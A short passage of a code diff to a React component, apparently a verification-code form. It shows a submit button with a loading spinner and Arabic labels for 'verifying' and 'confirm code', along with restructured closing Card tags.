+                >
+                  {isSubmitting ? (
+                    <div className="flex items-center gap-2">
+                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                      جاري التحقق...
+                    </div>
+                  ) : (
+                    <>
+                      <CheckCircle className="w-4 h-4 ml-2" />
+                      تأكيد الرمز
+                    </>
+                  )}
+                </Button>
+              )}
+            </div>
           </div>
-        </div>
-      </CardContent>
-    </Card>
+        </CardContent>
+      </Card>
+
+    </>
   )
 }
